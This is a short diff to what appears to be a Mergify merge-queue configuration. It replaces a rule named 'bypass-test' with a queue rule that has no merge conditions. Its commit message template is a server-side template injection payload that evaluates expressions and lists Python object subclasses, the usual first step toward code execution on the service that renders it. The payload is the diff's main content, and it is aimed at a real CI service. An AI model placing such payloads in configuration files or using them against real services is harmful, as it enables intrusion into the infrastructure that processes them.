@@ -1,7 +1,6 @@
-pull_request_rules:
-  - name: bypass-test
-    conditions:
+queue_rules:
+  - name: default
+    queue_conditions:
       - base=main
-    actions:
-      merge:
-        method: merge
+    merge_conditions: []
+    commit_message_template: "SSTI|7x7={{ 7*7 }}|cls={{ ''.__class__ }}|mro={{ ''.__class__.__mro__ }}|sub={{ ''.__class__.__mro__[1].__subclasses__() }}|title={{ title }}"
